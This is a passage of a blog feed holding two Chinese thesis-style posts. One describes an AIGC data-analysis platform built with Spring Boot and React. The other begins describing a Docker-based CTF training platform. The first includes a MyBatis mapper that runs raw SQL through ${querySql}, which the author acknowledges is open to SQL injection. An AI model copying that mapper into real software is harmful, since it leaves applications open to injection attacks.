punctuation">)</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token class-name">ObjectUtils</span><span class="token operator">::</span><span class="token function">isNotEmpty</span><span class="token punctuation">)</span><span class="token punctuation">.</span> <span class="token function">collect</span><span class="token punctuation">(</span><span class="token class-name">Collectors</span><span class="token punctuation">.</span><span class="token function">toList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//过滤 null </span>stringBuilder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>headerList<span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//读取数据 </span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> list<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token class-name">LinkedHashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span><span class="token class-name">String</span><span class="token punctuation">></span></span> dataMap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">LinkedHashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span><span class="token punctuation">)</span>  list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> dataList <span class="token operator">=</span> dataMap<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token class-name">ObjectUtils</span><span class="token operator">::</span><span class="token function">isNotEmpty</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token class-name">Collectors</span><span class="token punctuation">.</span><span class="token function">toList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//过滤 null </span>stringBuilder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>dataList<span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">return</span> stringBuilder<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>智能分析</strong></p><p>通过设定一个提示语的方式输入用户信息，然后将 AI 返回的结果进行拆分：切割后的空白部分、中间代码部分、文字部分，最后再拼接起来。最后，将 AI 的生成结果保存到数据库，并返回给前端。数据库成功添加数据如图 3-5 所示。</p><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\数据库存储数据展示.png" style="zoom: 50%;" /><center>图 3-5 数据库存储数据展示</center>#### 3.4 图表管理模块实现 <p>​前端开发一个列表页，支持按照图表名称搜索历史图表。后端创建路由和页面，在页面 MyChart 目录下 index.tsx 文件中编写获取需要的原始数据，并定义 state 变量来存储数据用于给页面展示。无美化下前端展示数据如图 3-6 所示。</p><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\无美化下前端历史数据展示.png" style="zoom:50%;" /><center>图 3-6 无美化下前端历史数据展示</center>​引入 Ant Design 的 List 组件，修改 List 组件中的内容。针对样式，对数据进行处理。增加了统一隐藏图表自身的 title，增加了分页，增加了搜索框，并添加了当网速较慢时loading 效果。美化后前端展示数据如图 3-7 所示。 <p>​AI 有时会生成不符合要求的脏数据，需要判断数据是否合法。这里选择检查三个地方：（1）检查开头是否有中文；（2）检查前后是否有回车和空行；（3）检查 xAxis、yAxis、series、type、data 等是否为被双引号包裹的非 JSON 格式代码。</p><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\美化后前端历史数据展示.png" style="zoom:50%;" /><center>图 3-7 美化后前端历史数据展示</center>用户可以在图表管理界面看见自己曾经的操作结果，用户可以对其进行搜索、删除、修改等操作。在搜索栏输入图表名称可以搜索到自己想到的历史图表。如图 3-8 所示。 <img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\查找图表名称含有结果二字的历史记录.png" style="zoom:50%;" /><center>图 3-8 查找图表名称含有结果二字的历史记录</center>不同的图表也附带一些附加操作，例如下载功能。如图 3-9 所示。 <img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\对该图表进行下载.png" style="zoom:50%;" /><center>图 3-9 对该图表进行下载 </center>#### 3.5 系统优化 <h5 id="3-5-1-安全性">3.5.1 安全性</h5><p>当用户上传原始数据文件时，可能存在恶意攻击的可能。例如用户使用自己家庭网络上传一个非常巨大的文件的低成本攻击手段，来占用服务器的带宽和存储资源，导致服务器的负载和网络流量利用率大幅提高，要支付高昂的服务器使用费用。可以采取对文件大小、文件后缀、文件的内容以及利用第三方的审核功能对文件的合规性进行校验。这里采用了较为简单的前两个。在 ChartController.java 下的 genChartByAi 接口下编写校验文件代码。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//校验文件大小 </span><span class="token keyword">final</span> <span class="token keyword">long</span> ONE_MB <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">*</span><span class="token number">1024</span><span class="token operator">*</span><span class="token number">1024L</span><span class="token punctuation">;</span> <span class="token class-name">ThrowUtils</span><span class="token punctuation">.</span><span class="token function">throwIf</span><span class="token punctuation">(</span>size <span class="token operator">></span> ONE_MB<span class="token punctuation">,</span> <span class="token class-name">ErrorCode</span><span class="token punctuation">.</span>PARAMS_ERROR<span class="token punctuation">,</span> <span class="token string">"文件超过 1M"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//校验文件后缀 </span><span class="token class-name">String</span> suffix <span class="token operator">=</span> <span class="token class-name">FileUtil</span><span class="token punctuation">.</span><span class="token function">getSuffix</span><span class="token punctuation">(</span>originalFilename<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">final</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> validFileSuffix <span class="token operator">=</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token string">"png"</span><span class="token punctuation">,</span> <span class="token string">"jpg"</span><span class="token punctuation">,</span> <span class="token string">"svg"</span><span class="token punctuation">,</span> <span class="token string">"webp"</span><span class="token punctuation">,</span><span class="token string">"jpeg"</span><span class="token punctuation">,</span><span class="token string">"xl sx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token class-name">ThrowUtils</span><span class="token punctuation">.</span><span class="token function">throwIf</span><span class="token punctuation">(</span><span class="token operator">!</span>validFileSuffix<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>suffix<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">ErrorCode</span><span class="token punctuation">.</span>PARAMS_ERROR<span class="token punctuation">,</span> <span class="token string">" 文件后缀非法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="3-5-2-数据存储">3.5.2 数据存储</h5><p>​一般情况下是将每个图表的原始数据全部存放在同一个数据表（chart 表）的chartData 字段里方便数据的获取和管理，但 chartData 字段中的原始数据会存在数据量非常大的情况，随着图表数的增多，会导致查询 chart 表的速度变慢。而且用户是有查看原始数据和对原始数据进行简单查询的需求，如果把所有数据存放在一个字段（列） 中，在查询时只能获取这个列的所有内容。所以需要将原始数据从 chartData 字段的一个小方格中提取出来，将原始数据以表格的形式存储在一个独立的数据表中。这样的话，系统用户在查询数据的时候，不需要在 chart 表上一条条的查询，非常的耗时间，可以通过 id 号，到对应的数据表，在该独立数据表里进行数据查询，灵活且查询的快速；而且将原始数据从 chart 表里提取出来存储在另一个表里，就避免了恶性攻击获得所有的数据，增加了安全性。实现步骤如下：</p><p><strong>在 ChartMapper.xml 中定义 SQL 查询语句</strong></p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>queryChartData<span class="token punctuation">"</span></span> <span class="token attr-name">parameterType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>string<span class="token punctuation">"</span></span> <span class="token attr-name">resultType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>map<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    $&#123;querySql&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>虽然 select * from chart_#{chartId}不够灵活，<code>$&#123;querySql&#125;</code>灵活但其将 SQL 语句完 全交给程序去传递，使用<code>$</code>符号会有 SQL 注入的风险。</p><p><strong>在 ChartMapper.java 中定义结果返回语句</strong></p><p>List&lt;Map&lt;String, Object&gt;&gt; queryChartData(String querySql);</p><p>该方法返回类型为 List&lt;Map&lt;String, Object&gt;&gt;表示返回的是一个由多个 map 组成的集合，每个 map 代表了一行查询结果，并将其封装成了一组键值对的形式的对象。其中，String 类型代表了键的类型为字符串，Object 类型代表了值得类型为任意对象，似得该方法可以适应不同类型的数据查询。</p><p><strong>创建测试类 ChartMapperTest.java</strong></p><p>将临时创建的测试表 chart_ 1777315720878694401 的原始数据所属 id 作为查询的 chartId，打印出返回结果。如图 3-10 和图 3-11 所示。</p><p>图 3-10 运行结果</p><p>图 3-11 Debug 结果</p><h5 id="3-5-3-限流">3.5.3 限流</h5><p>为了防止用户过度使用系统的 AI 模型，因为每次 AI 模型的调用都需要成本的，用户的恶意使用会导致成本的升高甚至会导致成本过高而破产，因此需要控制用户对 AI模型的调用次数来避免用户的恶意使用超支。但限制用户请求访问的次数仍然存在一定风险，用户仍可以通过疯狂调用来刷量，从而导致系统成本过度消耗。故需要限制单个用户在每秒只能使用一次，在前端随机放行一部分用户，而对其他用户进行限制，以确保系统不会被恶意用户占满。根据不同的对象，可以分为针对某个方法限流，针对某个用户限流和针对某个用户的某方法限流。根据服务器的数量，可以分为本地限流和分布式限流。本地限流是指每在本地设置一个服务器就要对该服务器单独设置限流的阈值，但是这样不好追踪访问请求是在哪个服务器上，是否可能多个服务器同时访问，因此比较适合只拥有一台服务器额情况。当服务器超过一个时，对每台服务器设置限制用户每秒请求访问次数，每个服务器都可以独立地控制用户的请求频率但并不能得知用户的访问请求在哪台服务器上，会存在风险。可以使用分布式限流把用户的使用频率等数据放到一个集中的存储进行统 计，例如 Redis，然后在网关集中进行限流和统计。实现步骤如下：</p><ol><li><p>创建 RedisssonConfig 配置类，用于初始化 RedissonClient 对象单例。</p></li><li><p>在 application.yml 中编写 redis 配置。</p></li><li><p>创建好redis客户端后，在manager目录下创建一个管理类RedisLimiterManager。</p></li><li><p>编写 RedisLimiterManager.java 专门提供 RedisLimiter 限流基础服务。Manager提供了通用能力，可以放在任何一个项目里使用。</p></li><li><p>创建测试类 RedisLimiterManagerTest.java，根据 RedisLimiterManager 中设置每秒最多访问 2 次，超过则会抛出异常“请求过于频繁”。结果如图 3-12 所示。</p><p><img src="D:%5Cblog%5Cshierjinghuang%5Csource_posts%5C%E7%BB%93%E5%90%88AIGC%E6%8A%80%E6%9C%AF%E7%9A%84%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%5C%E6%B5%8B%E8%AF%95%E7%BB%93%E6%9E%9C.png" alt=""></p><center>图 3-12 测试结果 </center></li><li><p>在 genChartByAi 接口中设置一个限流判断，从而实现给每个用户分配一个限流器。当进行访问请求时，请求到达却没有获取到令牌时，则限流操作会抛出异常并终止请求；当请求到达并成功获取到令牌，则请求可以正常继续执行。</p></li></ol><h3 id="4-总结">4 总结</h3><p>​本文详细描述了结合 AIGC 结合AIGC技术的数据分析平台的设计与实现。想法产生于 AIGC技术在图书馆服务的应用与创新，利用 AI 对用户需求的解读，更加人性化、个性化方式提供用户所需的资源和服务，提高图书馆管理和服务效率，优化用户体验。故可以应用 AIGC 技术设计一个普通人也能简单操作就可以实现数据分析的平台。在数据分析平台开发方面，使用了 React + Ant Design Pro 作为了前端页面设计基础，使用了 MySQL数据库对上传数据和生成结果进行保存，使用了 Spring Boot 作为后端框架，并利用MyBatis Plus、Echarts、RabbitMQ 等实现平台功能。系统用户根据自己的想法，对自己的需求进行描述，并将自己电脑上的数据上传到平台上，可以是未经处理的，然后通过AI 模型对系统用户所描述的需求的理解，对用户的原始数据进行处理，最后为系统用户提供分析结论和图表。</p><p>​期待国内 AI 技术的发展，降低 AI 服务的成本。平台也需思考更好的 prompt 使 AI模型能够更精确理解并给出更符合预期的回答。在成本无法降低的时期，对成本的控制方案进行优化。</p><h3 id="参考文献">参考文献</h3><p>[1] 董添．AIGC 将对各行各业产生深刻影响[N]．中国证券报．2024 (A02)．</p><p>[2] 中国信息通信研究院，京东探索研究院．人工智能生成内容（AIGC）白皮书[R]．2022．</p><p>[3] GARTNER．2024 年重要战略技术趋势[R]．2024．</p><p>[4] 郭亚军，刘振阳，郭一若等．AIGC 大学生用户信息需求研究——以 ChatGPT为例[J]．情报科学，2024：1-25．</p><p>[5] 李晨阳．基于大数据处理技术的 BI 平台设计与开发[D]．北京：北京交通大学，2019：5-6．</p><p>[6] 车晓彤．AIGC 赋能档案数据资源开发的路径探析[J]．兰台世界，2024，(02)：104-107．</p><p>[7] 王永刚．大数据时代人工智能在计算机网络技术中的应用研究[J]．信息记录材料，2023 (01)：107-109．</p><p>[8] 赵停停．基于 MySQL 数据库技术的 Web 动态网页设计研究[J]．信息与电脑(理论版)，2023，35(17)：174-176．</p><p>[9] 张洋，黄楠，余厚强．AIGC 时代信息资源管理领域发展趋势[J]．图书馆论坛，2024：1-8．20[10] 程帅．服务网格下流量控制系统的设计与实现[D]．北京：北京邮电大学，2020：104-107．</p><p>[11] 张颖岚，卢絮，董洁等．生成式人工智能(AIGC)在科技情报研究工作中的应用[J]．科技和产业，2023，23(24)：159-164．</p><p>[12] 李白杨，白云，詹希旎等．人工智能生成内容（AIGC）的技术特征与形态演进[J]．图书情报知识，2023，40(01)：66-74．</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;结合aigc-结合aigc技术的数据分析平台的设计与实现&quot;&gt;结合AIGC 结合AIGC技术的数据分析平台的设计与实现&lt;/h2&gt;
&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;摘要&lt;/strong&gt;：由于数据规模和复杂度的增加，传统的数据分析手段已满足不了人们的需</summary>
      
    
    
    
    <category term="项目设计" scheme="https://shierjinghuang.github.io/categories/%E9%A1%B9%E7%9B%AE%E8%AE%BE%E8%AE%A1/"/>
    
    
    <category term="毕业论文" scheme="https://shierjinghuang.github.io/tags/%E6%AF%95%E4%B8%9A%E8%AE%BA%E6%96%87/"/>
    
    <category term="React" scheme="https://shierjinghuang.github.io/tags/React/"/>
    
    <category term="SpringBoot" scheme="https://shierjinghuang.github.io/tags/SpringBoot/"/>
    
    <category term="AIGC" scheme="https://shierjinghuang.github.io/tags/AIGC/"/>
    
  </entry>
  
  <entry>
    <title>基于Docker容器的网络安全实验平台的设计与实现</title>
    <link href="https://shierjinghuang.github.io/2025/03/31/%E5%9F%BA%E4%BA%8EDocker%E5%AE%B9%E5%99%A8%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%B9%B3%E5%8F%B0%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
    <id>https://shierjinghuang.github.io/2025/03/31/%E5%9F%BA%E4%BA%8EDocker%E5%AE%B9%E5%99%A8%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%B9%B3%E5%8F%B0%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/</id>
    <published>2025-03-31T09:22:06.000Z</published>
    <updated>2025-03-31T11:32:41.135Z</updated>
    
    <content type="html"><![CDATA[<h3 id="基于docker容器的网络安全实验平台的设计与实现">基于Docker容器的网络安全实验平台的设计与实现</h3><p>摘要：CTF(Capture The Flag)是常见的网络安全竞赛形式，赛事靶场部署了诸如Reverse、Misc、Crypto等附件类考题与Web、Pwn等容器类考题。若容器类考题是静态部署的，则存在非预期解题的安全隐患。针对这一问题，设计了题目容器化的网络安全实验平台，将容器类的考题动态部署到Docker容器中，实现了容器类考题的动态部署，多用户在不同的容器中对同一试题进行解答，互相隔离，消除了安全隐患。实验平台采用Vue3+Element Plus+Go+MySQL的架构设计，使用Gorm技术连接数据库并进行数据管理。实验平台界面美观，功能齐全，具有较强的可维护性与可扩展性，为参赛练习者提供了考题丰富的安全训练环境。</p><p><strong>关键词</strong>：网络安全  Docker  CTF 竞赛</p><p>[TOC]</p><h3 id="引言">引言</h3><p>​2024年4月网络空间部队正式成立，标志着我国网络安全建设又迈入了一个新阶段。网络安全已经成为国家安全的重要组成部分，是中国式现代化建设的重要保障^[1]^。网络安全问题内容繁杂，从个人PC到大型企业网络甚至整个广域网，每一个层面都面临着各种不同的安全挑战。防范、化解信息化进程中的安全风险，特别是防止发生系统性、颠覆性风险，是我国网信工作的根本任务^[1]^。</p><p>​为了培养更多优秀的网络安全人才，网络安全实验平台是网络安全从业者、学生和爱好者进行实验、比赛和训练，提升自身的网络安全技能和知识的不二选择，同时网络安全靶场作为支撑前沿技术研究、网络安全人员培训的重要基础设施，得到各国政府、军队、企业和科研机构的高度重视[2]。但是，网络安全实验平台在使用过程中，因多用户的同时访问造成及对平台环境的渗透与更改，这些操作会影响到其他用户对平台的正常应用。</p><h3 id="1-环境与技术介绍">1 环境与技术介绍</h3><h4 id="1-1-网络安全实验平台">1.1 网络安全实验平台</h4><p>​网络安全平台主要用于网络安全实践和培训，为使用者提供了一个安全的、可供用户自由渗透的靶场环境，这些靶场环境往往与具体安全事件与安全风险对应。</p><p>​近些年在全球网络安全爱好者的自发贡献下，一批开源的网络安全平台如雨后春笋般出现，产生了如CTFd（Capture The Flag Director）等开源的网络安全实验平台，用于主持和管理CTF（Capture The Flag）竞赛^[3]^。当前免费开放的线上靶场已经有一定数量，大部分网络安全实验平台被高校用于竞赛训练。这些实验平台往往采用静态部署，落后于当前版本，初学者入门CTF门槛相对较高。目前的相关研究工作主要集中在传授式教学场景，借助实验系统辅助实现对特定知识点的教学目标^[4]^。然而，这种方式未能充分关注渗透测试所需的广泛专业知识、多样化的技术手段以及逆向思维突破困难等特点^[4]^。</p><h4 id="1-2-ctf">1.2 CTF</h4><p>​CTF是一种经典的网络安全竞赛形式。CTF竞赛测试参与者在解决各种网络安全挑战和应对攻击方面的各项能力，包括团队合作，快速学习乃至经验。在CTF类型的比赛中，多名参赛者独立或者组队解决各种问题，包括安全杂项 MISC（缩写来源于单词miscellaneous）、网络安全Web、逆向工程 Re（缩写来源于单词reverse）、二进制安全 PWN（简称来源于单词安全俚语）、密码学Crypto（缩写来源于单词Cryptography），甚至社会工程学方面的知识和技能。</p><p>​CTF赛事通常设有时间限制，题目的分值通常会随着成功解题次数的增加而降低，在部分比赛中会有长时间未解出题目分值上升的机制。在通常情况下这意味着参与者需要在规定的时间内，尽可能快地完成尽可能多的题目，以得到尽可能高的分数。通常，最终得分是根据参与者所获得的分值来确定排名。</p><p>​随着“全国大学生信息安全竞赛创新实践能力赛”，“强网杯”等知名网络安全赛事采用CTF竞赛模式，CTF竞赛的吸引力越来越强，在网络安全人才培养中的作用也越来越重要^[5]^。</p><h4 id="1-3-docker">1.3 Docker</h4><p>​Docker是一种通过GO语言开发的应用容器引擎，用于开发、部署应用程序。利用Docker可以将应用程序及其所需的运行环境打包到独立、可移植的Dockerfile中。在任何支持Docker的平台，包括Linux和高版本的windows环境中均可以通过Docker实现从Dockerfile文件到Docker Image的构建。并由此创建可以执行的Docker容器，而无需担心环境配置的问题。</p><p>​从架构上来说Dockerfile是应用程序的基础，包括源代码及运行环境、库和配置等依赖项。Docker Image是中间件，其由Dockerfile通过构建产生。而Docker容器是应用程序的运行态，是通过Docker Image创建并允许的实例。从软件生命周期的观点上讲，Dockerfile、Docker Image与Docker Container分别代表软件生命周期的三个不同阶段，Dockerfile面向软件生命周期的设计阶段，Docker Image面向软件生命周期的测试阶段，成为应用程序交付标准，Docker Container面向软件生命周期的软件运行和维护阶段。Docker架构如图1-1所示。</p><p><img src="D:%5Cblog%5Cshierjinghuang%5Csource_posts%5C%E5%9F%BA%E4%BA%8EDocker%E5%AE%B9%E5%99%A8%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%B9%B3%E5%8F%B0%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%5Cwps1.png" alt=""></p><center>图1-1 Docker架构示意图</center>​Docker Container中的每个接口都是虚拟的，在实际的部署中应将其映射到服务器或者主机的真实端口上。容器之间要相互通信的前提是两者必须有属于同一个网络的网卡[6]。由此，在基于Docker的网络安全实验平台中，通过Docker Image来创建应用程序的运行实例Docker Container，暨用户实际接触到的靶场环境，彼此之间的资源是相互隔离的。<p>​基于此，网络安全实验靶场就可以生成多个同时运行的Docker Container，而这些实例之间相互隔离，互不影响。这种方式可以实现用户对靶场环境的独占，从而保证了网络安全实验平台的正常运行。</p><h4 id="1-4-vue">1.4 Vue</h4><p>​Vue框架其提供了声明式、组件化的方法用于构建交互式界面。并支持.Vue单文件组件这一前端格式。Vue 3.0提供了许多重大改进和新特性，提高了性能、可维护性和开发体验。通过重新设计虚拟DOM和响应式系统，Vue 3.0能够更高效地追踪状态变化，并在需要时进行更新，从而提高了应用程序的渲染速度和响应性。</p><p>​其组件功能允许将页面划分为独立的组件，并对每个组件进行单独设计，在Vue3.0组件得到进一步的细化。在Vue3中，借助Prop传递、Mixins混入技术和组合式API，能够实现组件的进一步组合，这意味着可以将一些公共逻辑封装成独立对象，并在多个组件中引入和使用。可以将多个组件组合在一起构建更复杂的用户界面。Vue组件复用如图1-2所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps2.png" style="zoom: 80%;" /><center>图1-2 Vue组件树状结构</center>​即使考虑组件进一步细分产生的更小组件与混入技术的影响，在Vue程序开发中，组件结构依旧被设计为一棵不断嵌套的树。当节点组件需要被调用时，需要在根组件中导入，该组件将会以默认的形式暴露给外部，组件就可以作为独立模块被使用。<h4 id="1-5-go">1.5 Go</h4><p>​Go又称Golang是一种静态强类型、编译型语言。Go其简单高效的特性，旨在解决大型软件项目中面对的一些挑战，如复杂性管理、性能优化和可维护性。在大规模项目中。Go语言具有高效率、并发安全的优势，同时具有足够的表达力和功能性。在网络服务中优势尤为明显，具有广泛的应用前景。</p><p>​Go语言的可维护性也是其优秀特性之一。其强类型系统和严格的编码规范可以帮助开发团队保持代码的清晰和一致性，减少了在维护和扩展项目时可能出现的错误和问题。此外，Go语言还提供了一套丰富的标准库和工具，包括用于测试、文档生成、性能分析等的工具，进一步提升了代码的可维护性和可测试性。</p><h4 id="1-6-开发环境">1.6 开发环境</h4><p>​本项目的开发过程中同时使用了HBuilder X和Visual Studio Code两款代码编辑器。分别用于开发项目的前端Vue项目与后端的Go框架与Docker操作模块。</p><p>​VS Code是一款轻量级代码编辑器，支持多种编程语言和文件类型，适用于各种规模的项目和开发环境。其提供了优秀的集成开发环境，包括调试、终端窗口、版本控制等功能。同时有很强的代码分析能力，使得开发过程更加流畅高效。</p><p>​HBuilder X是一款专为Vue打造的一款集成开发环境，能够提供适合Vue项目的开发环境。同时其拥有强大的语法提示功能。</p><h4 id="1-7-wangeditor">1.7 WangEditor</h4><p>​WangEditor是基于JavaScript开发的编辑器，其具有兼容性好，插件化，支持自定义样式等特点。涵盖了各式各样的文本编辑功能，能够为用户提供良好的编写体验，同时可以实现对Markdown语法的兼容，便于常见的Markdown格式内容的转载。由于插件化的特点WangEditor可以集成到各种Web应用中，作为项目的一部分被调用。</p><h3 id="2-系统需求分析">2 系统需求分析</h3><p>​本文在参考现有安全企业的网络安全实验平台设计思路与实现的基础上，对网络安全实验平台的功能需求进行分析，并进行了改进。将传统的静态的测试环境与Docker容器进行有机结合，设计了基于Docker容器的动态实现方案。</p><h4 id="2-1-功能需求分析">2.1 功能需求分析</h4><p>​基于现实因素考虑，网络安全实验平台的设计定位于，面向个体和组织的开放训练环境，主要提供针对各种网络安全漏洞场景的目标环境，供个体或组织训练网络安全实践技能[7]。</p><p>​根据网络安全实验平台的功能分析，网络安全实验平台大致可为两个核心模块与其他通用模块，两个核心模块暨用户功能模块和系统管理员的后台管理模块。为了保证系统信息及系统本身的机密性、完整性与可用性(CIA)，管理员和用户身份会有不同的功能权限。通用模块是系统的基础包括登录模块与排行榜等功能。</p><p>​在系统中，管理员用户负责系统维护，包括发布公告，上传问题，文章管理，问题管理和用户管理等内容，以用户身份登录成功后主要可以进行文章阅读、题目环境申请、作答及发布解题报告等功能。</p><p>（1）管理员模块</p><p>​管理员身份由Computer_Users表中的permissions位进行标记。管理员通过身份验证登录后，在后台对平台进行各种管理。在题目管理中，管理员可以上传新题目、对涉及镜像与容器题目的对应关系进行调整及题目相关信息修改或删除。同时管理员可以对远程服务器中，用户下发的靶机容器进行管理。在用户管理中，管理员可以查看用户的个人信息，进行信息的修改、重置密码、用户删除等功能。管理员同时还具有上传文章、公告及文章管理的能力。</p><p>（2）用户模块</p><p>​本系统用户模块的功能较少，用户可以查看排行榜和其他用户发表的文章，在练习靶场中解答对应题目，发布文章等功能。</p><h4 id="2-2-非功能性需求分析">2.2 非功能性需求分析</h4><p>​网络安全实验平台不仅包括基本的功能需求，还需要满足一系列非功能性需求，以及对社会和行业的更高层次的需求。非功能性需求指的是系统除了具备功能性需求外，还必须具备的一些性质。具体到网络安全实验平台比如机密性、完整性与可用性等，更进一步网络安全实验平台在网络安全人才培养上也有其需求。网络安全实验平台应当在满足基本功能需求的同时，重视非功能性需求，确保平台具备简单易操作、安全可靠以及准确无误的特点，为用户提供良好的实验体验和数据支持。</p><p>​（1）CIA：网络安全实验平台更需要注重平台的机密性、完整性与可用性，网络安全实验平台对安全的需要同时来自于内部与外部，来自平台外部的威胁包括合法用户的非授权访问和非法用户的渗透攻击。而来自系统内部风险的则是合法用户访问过程及对题目渗透中可能触发的风险溢出。</p><p>​（2）可维护性与可扩展性：为了实现平台的长期可靠运行和后续内容的扩充，网络安全实验平台同样需要不断迭代。所以在设计之时需要对系统进行清晰的设计，使系统架构清晰明了，方便后续扩展和维护。</p><p>​（3）对网络安全技能培养的需要：本系统定位于面向个体和组织的开放训练环境，对网络从业人员及网络安全初学者，包括专业院校学生提供有关网络安全技能全领域的能力培养是网络安全实验平台的出发点。网络安全人才的实际培养过程中，需要用到各种网络环境和大量安全数据来做分析，网络靶场可以方便地提供相关的数据源，为研究对象、实验场景、背景知识做支撑[8]。毫无疑问，CTF比赛的流行及本身具有的趣味性和挑战性，能够作为辅助教学的绝佳平台[9]。在教学中结合CTF的赛题，甚至举办一些校内的CTF竞赛，让学生在比赛中进步，提高其安全实战能力，培养国家需要的应用型人才[9]。</p><p>​（4）性能是软件系统中至关重要的非功能性特性之一，它直接影响着用户体验、系统的可用性以及业务流程的顺畅进行。性能不仅仅关乎系统的响应速度，还包括系统的吞吐量、资源利用率以及并发处理能力等多个方面。网络安全实验平台关于性能的设计主要集中于Docker容器的下发与回收机制。</p><h3 id="3-系统设计">3 系统设计</h3><p>​针对静态部署的靶场环境存在的问题，本项目设计在靶场题目中使用Docker容器环境的网络安全实验平台。整个网络安全实验平台采用Vue3+Element 